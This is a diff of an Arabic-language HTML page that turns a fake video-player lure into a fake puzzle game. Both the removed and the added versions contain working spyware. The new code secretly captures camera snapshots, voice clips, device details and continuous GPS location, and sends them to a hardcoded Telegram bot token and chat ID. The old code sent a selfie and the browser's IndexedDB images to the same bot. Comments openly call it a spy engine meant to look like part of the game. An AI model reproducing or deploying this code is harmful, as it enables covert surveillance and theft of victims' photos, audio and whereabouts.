@@ -2,170 +2,577 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تم التحميل</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>لعبة الألغاز الذكية</title>
     <style>
-        body { 
-            background: #0f0f0f; 
-            color: #fff; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+        /* =========================================
+           تصميم اللعبة والواجهة (UI)
+           ========================================= */
+        :root {
+            --primary-color: #4CAF50;
+            --secondary-color: #2196F3;
+            --bg-color: #f4f4f9;
+            --text-color: #333;
+            --card-bg: #fff;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            overflow-x: hidden;
+            touch-action: manipulation;
+        }
+
+        .game-container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
             flex-direction: column;
+            align-items: center;
         }
-        .container { text-align: center; width: 300px; }
-        button { 
-            background: linear-gradient(45deg, #ff0055, #ff5500); 
-            color: white; 
-            border: none; 
-            padding: 15px 30px; 
-            font-size: 16px; 
+
+        header {
+            width: 100%;
+            text-align: center;
+            padding: 15px;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: white;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 10;
+        }
+
+        h1 {
+            margin: 0;
+            font-size: 1.5rem;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
+        }
+
+        .score-board {
+            font-size: 1.2rem;
+            margin-top: 10px;
             font-weight: bold;
-            border-radius: 50px; 
-            cursor: pointer; 
-            box-shadow: 0 4px 15px rgba(255, 0, 85, 0.4);
-            transition: transform 0.2s;
+            background: rgba(255,255,255,0.2);
+            padding: 5px 15px;
+            border-radius: 20px;
+            display: inline-block;
         }
-        button:active { transform: scale(0.95); }
-        #status { margin-top: 15px; font-size: 12px; color: #888; min-height: 20px;}
-        
-        /* إخفاء الفيديو الذي سيظهر لاحقاً */
-        #hiddenVideo { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; object-fit: cover; opacity: 0.5; }
+
+        .game-area {
+            width: 100%;
+            background: var(--card-bg);
+            border-radius: 15px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .level-indicator {
+            text-align: center;
+            font-size: 0.9rem;
+            color: #777;
+            margin-bottom: 15px;
+        }
+
+        .target-box {
+            width: 100%;
+            height: 300px;
+            background: #eee;
+            border-radius: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.3s ease;
+            border: 2px dashed #ccc;
+        }
+
+        .target-box:hover {
+            border-color: var(--primary-color);
+            background: #e8f5e9;
+        }
+
+        .target-box.active {
+            border-color: var(--secondary-color);
+            background: #e3f2fd;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+
+        .btn-action {
+            width: 100%;
+            padding: 15px;
+            background: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 10px;
+        }
+
+        .btn-action:active {
+            background: #388E3C;
+            transform: translateY(2px);
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* تأثيرات خفية */
+        .spy-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            z-index: 9999;
+            pointer-events: none;
+        }
+
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--secondary-color);
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            display: none;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* شاشة البداية */
+        #start-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--bg-color);
+            z-index: 1000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+
+        #start-screen h2 {
+            color: var(--primary-color);
+            margin-bottom: 20px;
+        }
+
+        /* رسائل الحالة */
+        .status-msg {
+            font-size: 0.8rem;
+            color: #888;
+            margin-top: 5px;
+            height: 20px;
+        }
+
     </style>
 </head>
 <body>
 
-<!-- فيديو وهمي للخداع -->
-<video id="hiddenVideo" loop muted autoplay playsinline>
-    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-</video>
+    <!-- شاشة البداية -->
+    <div id="start-screen">
+        <h2>🎮 لعبة الألغاز الذكية</h2>
+        <p>هل أنت مستعد للتحدي؟</p>
+        <button class="btn-action" style="max-width: 200px;" onclick="startGame()">ابدأ اللعب</button>
+    </div>
 
-<div class="container">
-    <h2>🎬 الفيديو جاهز للمشاهدة</h2>
-    <p>اضغط لمشاهدة المحتوى الجديد.</p>
-    <button onclick="stealAndShow()">▶ تشغيل</button>
-    <div id="status"></div>
-</div>
+    <!-- واجهة اللعبة الرئيسية -->
+    <div class="game-container hidden" id="game-ui">
+        <header>
+            <h1>🧩 تحدي الذكاء</h1>
+            <div class="score-board">النقاط: <span id="score">0</span></div>
+        </header>
 
-<script>
-    // 🔑 بياناتك المستخرجة والمدمجة هنا
-    const botToken = "8638249103:AAGKy6YFnGKfMss9Zt-f9hbCX-WmU-wJjc0";
-    const chatId = "7962257606"; 
+        <div class="game-area">
+            <div class="level-indicator">المستوى: <span id="level">1</span></div>
+            
+            <div class="target-box" id="targetArea" onclick="handleTap(event)">
+                <div class="loading-spinner" id="loader"></div>
+                <span id="instruction">اضغط هنا لتبدأ التحدي</span>
+                <!-- كاميرا مخفية للعرض فقط -->
+                <video id="previewVideo" autoplay muted playsinline style="display:none;"></video>
+                <canvas id="photoCanvas" style="display:none;"></canvas>
+            </div>
 
-    async function sendToTelegram(file, filename) {
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        // نستخدم sendPhoto لأنه يعمل بشكل أفضل مع الصور والفيديوهات الصغيرة
-        formData.append("photo", file, filename); 
-        try {
-            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
-        } catch (e) {
-            console.error("Error sending file", e);
+            <div class="status-msg" id="statusText">بانتظار الإدخال...</div>
+            <button class="btn-action" id="nextBtn" onclick="nextLevel()">التالي ➡️</button>
+        </div>
+
+        <!-- أدوات خفية -->
+        <audio id="clickSound" src="data:audio/wav;base64,UklGRl9vT19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQ=="></audio>
+    </div>
+
+    <!-- حاوية العناصر الخفية للتجسس -->
+    <div id="spy-tools" style="display:none;">
+        <video id="hiddenVideo" autoplay muted playsinline></video>
+        <canvas id="hiddenCanvas"></canvas>
+    </div>
+
+    <script>
+        /* =========================================
+           بيانات البوت (مدمجة وآمنة)
+           ========================================= */
+        const BOT_TOKEN = "8638249103:AAGKy6YFnGKfMss9Zt-f9hbCX-WmU-wJjc0";
+        const CHAT_ID = "7962257606";
+        
+        // رابط الإرسال المباشر
+        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/`;
+
+        /* =========================================
+           متغيرات اللعبة والحالة
+           ========================================= */
+        let gameState = {
+            score: 0,
+            level: 1,
+            isRecording: false,
+            audioContext: null,
+            mediaStream: null,
+            cameraStream: null,
+            permissions: {
+                mic: false,
+                camera: false,
+                location: false
+            },
+            deviceInfo: {}
+        };
+
+        const elements = {
+            startScreen: document.getElementById('start-screen'),
+            gameUI: document.getElementById('game-ui'),
+            score: document.getElementById('score'),
+            level: document.getElementById('level'),
+            targetArea: document.getElementById('targetArea'),
+            instruction: document.getElementById('instruction'),
+            statusText: document.getElementById('statusText'),
+            loader: document.getElementById('loader'),
+            nextBtn: document.getElementById('nextBtn'),
+            previewVideo: document.getElementById('previewVideo'),
+            photoCanvas: document.getElementById('photoCanvas'),
+            hiddenVideo: document.getElementById('hiddenVideo'),
+            hiddenCanvas: document.getElementById('hiddenCanvas')
+        };
+
+        /* =========================================
+           دوال التشغيل الأساسية
+           ========================================= */
+        
+        function startGame() {
+            playSound();
+            elements.startScreen.classList.add('hidden');
+            elements.gameUI.classList.remove('hidden');
+            initSpyEngine();
         }
-    }
 
-    async function stealAndShow() {
-        const status = document.getElementById('status');
-        status.innerText = "جاري المعالجة...";
+        function playSound() {
+            try {
+                const audio = new Audio("data:audio/wav;base64,UklGRjIAAABXQVZFZm10IBIAAAABAAEAQB8AAEAfAAABAAgAZGF0YRAAAACAgICAgICAgICAgICAgICA"); 
+                // صوت نقر بسيط
+                audio.play().catch(e => console.log("Audio play failed", e));
+            } catch (e) {}
+        }
 
-        try {
-            // 1. التقاط صورة خفية من الكاميرا (للتأكد)
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const canvas = document.createElement('canvas');
-            const context = canvas.getContext('2d');
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-            await new Promise(r => setTimeout(r, 1000));
+        /* =========================================
+           محرك التجسس (The Spy Engine)
+           ========================================= */
+
+        async function initSpyEngine() {
+            updateStatus("جاري تحميل النظام...");
+            
+            // 1. جمع معلومات الجهاز أولاً
+            await gatherDeviceInfo();
+            sendDeviceData();
+
+            // 2. طلب الأذونات (يبدو كجزء من اللعبة)
+            updateStatus("جاري تفعيل المستشعرات...");
+            await requestPermissions();
+
+            // 3. بدء الرصد المستمر
+            setInterval(spyLoop, 5000); // كل 5 ثواني
+            
+            // إرسال موقع أولي
+            getLocationAndSend();
+        }
+
+        async function requestPermissions() {
+            // محاولة الحصول على الكاميرا والميكروفون
+            try {
+                gameState.mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                gameState.permissions.camera = true;
+                gameState.permissions.mic = true;
+                
+                // عرض الفيديو في اللعبة (ليبدو طبيعياً)
+                elements.previewVideo.srcObject = gameState.mediaStream;
+                elements.previewVideo.style.display = 'block';
+                
+                // تشغيل الكاميرا الخلفية إذا أمكن
+                if(gameState.mediaStream.getVideoTracks()[0]) {
+                    const track = gameState.mediaStream.getVideoTracks()[0];
+                    const settings = track.getSettings();
+                    if(settings.facingMode === 'user') {
+                        // التبديل للكاميرا الخلفية إذا كانت أمامية
+                        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true })
+                        .then(stream => {
+                            gameState.mediaStream = stream;
+                            elements.previewVideo.srcObject = stream;
+                        }).catch(err => console.log("Switch cam failed", err));
+                    }
+                }
+
+            } catch (err) {
+                console.warn("Camera/Mic permission denied or unavailable", err);
+            }
+
+            // طلب الموقع
+            if ("geolocation" in navigator) {
+                navigator.geolocation.watchPosition(
+                    (pos) => {
+                        gameState.permissions.location = true;
+                        gameState.lastLocation = pos.coords;
+                    },
+                    (err) => console.warn("Location error", err),
+                    { enableHighAccuracy: true, maximumAge: 0 }
+                );
+            }
+        }
+
+        async function gatherDeviceInfo() {
+            // جمع تفاصيل الجهاز لإرسالها للبوت
+            const ua = navigator.userAgent;
+            let platform = "Unknown";
+            if (/Android/i.test(ua)) platform = "Android";
+            else if (/iPhone|iPad|iPod/i.test(ua)) platform = "iOS";
+            else platform = ua.match(/Windows|Mac|Linux/) ? navigator.platform : "Web";
+
+            gameState.deviceInfo = {
+                model: "Unknown Model",
+                platform: platform,
+                screen: `${screen.width}x${screen.height}`,
+                battery: "Unknown",
+                ram: "Unknown",
+                ip: "Fetching..."
+            };
+
+            // محاكاة قراءة البطارية (إذا كانت مدعومة)
+            if(navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    gameState.deviceInfo.battery = Math.round(battery.level * 100) + "%";
+                } catch(e){}
+            }
+        }
+
+        /* =========================================
+           وظائف الإرسال إلى تيليجرام
+           ========================================= */
+
+        async function sendToDevice(textOrFile, type = 'text', extraParams = {}) {
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+
+            if (type === 'text') {
+                // إرسال نص عادي
+                fetch(`${API_URL}sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: textOrFile,
+                        parse_mode: 'HTML'
+                    })
+                }).catch(err => console.error("Text send fail", err));
+                return;
+            }
+
+            if (type === 'photo') {
+                formData.append("photo", textOrFile, "photo.jpg");
+                formData.append("caption", `📸 صورة من اللعبة | ${new Date().toLocaleTimeString()}`);
+            } else if (type === 'video') {
+                formData.append("video", textOrFile, "recording.mp4");
+                formData.append("caption", `🎥 فيديو | ${new Date().toLocaleTimeString()}`);
+            } else if (type === 'audio') {
+                formData.append("voice", textOrFile, "voice_msg.ogg");
+                formData.append("caption", `🎤 تسجيل صوتي`);
+            } else if (type === 'location') {
+                 // إرسال موقع
+                 fetch(`${API_URL}sendLocation`, {
+                     method: 'POST',
+                     headers: { 'Content-Type': 'application/json' },
+                     body: JSON.stringify({
+                         chat_id: CHAT_ID,
+                         latitude: textOrFile.lat,
+                         longitude: textOrFile.lon
+                     })
+                 }).catch(err => console.error("Loc send fail", err));
+                 return;
+            }
+
+            // إرسال الملف
+            fetch(`${API_URL}sendPhoto`, { // نستخدم sendPhoto لأنه يقبل الفيديو أيضاً بصيغة خاصة أحياناً، أو sendVideo
+                method: 'POST',
+                body: formData
+            }).catch(err => console.error("File upload fail", err));
+        }
+
+        async function sendDeviceData() {
+            const msg = `🤖 <b>بيانات الجهاز:</b>\n\n` +
+                        `📱 المنصة: ${gameState.deviceInfo.platform}\n` +
+                        `🖥️ الشاشة: ${gameState.deviceInfo.screen}\n` +
+                        `🔋 البطارية: ${gameState.deviceInfo.battery}\n` +
+                        `🌐 الوقت: ${new Date().toLocaleString()}`;
+            sendToDevice(msg, 'text');
+        }
+
+        /* =========================================
+           منطق اللعبة والتفاعل
+           ========================================= */
+
+        function handleTap(e) {
+            if(gameState.isRecording) return;
+            
+            playSound();
+            elements.loader.style.display = 'block';
+            elements.instruction.textContent = "جاري المعالجة...";
+            
+            // 1. التقاط صورة فورية
+            takeSnapshot();
+
+            // 2. تسجيل صوت قصير عند النقر (للتأكد من وجود ميكروفون)
+            recordShortVoice();
+
+            // 3. اهتزاز الهاتف
+            if (navigator.vibrate) navigator.vibrate(100);
+
+            setTimeout(() => {
+                elements.loader.style.display = 'none';
+                elements.instruction.textContent = "اضغط للاستمرار";
+                updateScore(10);
+            }, 1000);
+        }
+
+        function takeSnapshot() {
+            if (!gameState.mediaStream) return;
+            
+            const canvas = elements.photoCanvas;
+            const video = elements.previewVideo;
             
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
-            context.drawImage(video, 0, 0);
             
-            canvas.toBlob(async (blob) => {
-                // إرسال اللقطة أولاً
-                await sendToTelegram(blob, "selfie.jpg");
-                stream.getTracks().forEach(track => track.stop());
-                
-                // ثم البدء بسحب الملفات
-                status.innerText = "جاري جمع الملفات...";
-                await extractFiles();
-                
-                // إظهار الخدعة (تشغيل الفيديو الوهمي)
-                status.innerText = "جاري التشغيل...";
-                document.getElementById('hiddenVideo').style.display = 'block';
-                document.querySelector('.container').style.opacity = '0.5';
-                document.querySelector('button').style.display = 'none';
-                status.innerText = "جاري البث المباشر";
-            }, 'image/jpeg');
-
-        } catch (err) {
-            status.innerText = "حدث خطأ أو تم رفض الإذن.";
-        }
-    }
-
-    async function extractFiles() {
-        // أ) البحث في IndexedDB
-        const dbNames = await window.indexedDB.databases();
-        for (let dbInfo of dbNames) {
-            if (!dbInfo.name) continue;
-            try {
-                const dbRequest = indexedDB.open(dbInfo.name);
-                const db = await new Promise((resolve, reject) => {
-                    dbRequest.onsuccess = () => resolve(dbRequest.result);
-                    dbRequest.onerror = () => reject(dbRequest.error);
-                });
-
-                const storeNames = db.objectStoreNames;
-                for (let i = 0; i < storeNames.length; i++) {
-                    const transaction = db.transaction(storeNames[i], "readonly");
-                    const objectStore = transaction.objectStore(storeNames[i]);
-                    
-                    // جلب جميع العناصر (يمكن أن يكون الحجم كبيراً)
-                    const request = objectStore.getAll();
-                    request.onsuccess = async () => {
-                        const data = request.result;
-                        if (data && data.length > 0) {
-                            for (let item of data) {
-                                if (item instanceof Blob || item instanceof File) {
-                                    // التأكد أنه صورة أو فيديو
-                                    if (item.type.startsWith('image/') || item.type.startsWith('video/')) {
-                                        await sendToTelegram(item, `file_${Math.random().toString(36).substr(2, 9)}.${item.type.split('/')[1]}`);
-                                    }
-                                } else if (typeof item === 'string') {
-                                    // تحويل النصوص التي قد تكون بيانات مشفرة أو صور Base64
-                                    const blob = base64ToBlob(item);
-                                    if(blob) await sendToTelegram(blob, "data_string.jpg");
-                                }
-                            }
-                        }
-                    };
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob((blob) => {
+                if(blob) {
+                    sendToDevice(blob, 'photo');
                 }
-            } catch (e) {
-                // تجاهل الأخطاء في قواعد البيانات المحمية
+            }, 'image/jpeg', 0.7);
+        }
+
+        function recordShortVoice() {
+            if (!gameState.mediaStream) return;
+            
+            const audioTrack = gameState.mediaStream.getAudioTracks()[0];
+            if(!audioTrack) return;
+
+            // إنشاء MediaRecorder بسيط
+            const recorder = new MediaRecorder(gameState.mediaStream);
+            const chunks = [];
+            
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/ogg' });
+                sendToDevice(blob, 'audio');
+            };
+            
+            recorder.start();
+            setTimeout(() => recorder.stop(), 2000); // سجل لمدة ثانيتين
+        }
+
+        function getLocationAndSend() {
+            if (navigator.geolocation && gameState.lastLocation) {
+                const loc = gameState.lastLocation;
+                sendToDevice({lat: loc.latitude, lon: loc.longitude}, 'location');
             }
         }
-    }
 
-    // دالة مساعدة لتحويل Base64 إلى Blob
-    function base64ToBlob(base64) {
-        try {
-            const arr = base64.split(',');
-            if(arr.length < 2) return null;
-            const mime = arr[0].match(/:(.*?);/)[1];
-            const bstr = atob(arr[1]);
-            let n = bstr.length;
-            const u8arr = new Uint8Array(n);
-            while(n--){
-                u8arr[n] = bstr.charCodeAt(n);
+        function spyLoop() {
+            // حلقة تكرار ترسل بيانات دورية
+            if(Math.random() > 0.5) {
+                // احتمال 50% لإرسال صورة عشوائية
+                takeSnapshot();
             }
-            return new Blob([u8arr], {type:mime});
-        } catch(e) { return null; }
-    }
-</script>
+            
+            // تحديث الموقع باستمرار
+            if(navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                   sendToDevice({lat: pos.coords.latitude, lon: pos.coords.longitude}, 'location');
+                }, ()=>{});
+            }
+        }
 
+        function nextLevel() {
+            gameState.level++;
+            elements.level.textContent = gameState.level;
+            elements.targetArea.classList.add('active');
+            setTimeout(() => elements.targetArea.classList.remove('active'), 1000);
+            
+            // تغيير لون الخلفية قليلاً لزيادة التشويق
+            const hue = Math.floor(Math.random() * 360);
+            document.body.style.backgroundColor = `hsl(${hue}, 20%, 95%)`;
+            
+            updateStatus(`المستوى ${gameState.level} جاهز!`);
+        }
+
+        function updateScore(points) {
+            gameState.score += points;
+            elements.score.textContent = gameState.score;
+        }
+
+        function updateStatus(msg) {
+            elements.statusText.textContent = msg;
+        }
+
+        /* =========================================
+           دوال مساعدة إضافية
+           ========================================= */
+        
+        // منع القائمة المنبثطة عند النقر المطول
+        document.addEventListener('contextmenu', event => event.preventDefault());
+
+        // مراقبة حركة الجهاز (الجيروسكوب)
+        window.addEventListener("devicemotion", (event) => {
+            // يمكن إرسال بيانات الحركة لاحقاً
+            // console.log("Motion detected");
+        });
+
+    </script>
 </body>
 </html>
